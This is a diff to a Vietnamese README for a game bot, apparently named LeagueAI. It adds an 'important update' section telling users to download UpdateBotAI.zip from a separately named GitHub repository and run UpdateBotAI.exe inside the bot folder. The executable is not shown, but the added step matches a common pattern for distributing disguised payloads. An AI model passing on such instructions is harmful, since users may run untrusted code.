@@ -46,5 +46,11 @@ Tuỳ chỉnh nâng cao
     "8": "W",
   }
 ```
+Cập nhật quan trọng V0.1.0
+===
+Để có thể cập nhật nhanh chóng bot này, các bạn hãy tải về "Bot cập nhật LeagueAI" [tại đây](https://github.com/kgemas/Tool-Update-LeagueAI/releases/download/v1.0.0/UpdateBotAI.zip).
+
+Tóm tắt: Tải về và giải nén cùng trong folder của bot. Sau đó chạy "UpdateBotAI.exe", nó sẽ tự thay thế các bản cũ.
+
 
 Good luck 🐱‍👤
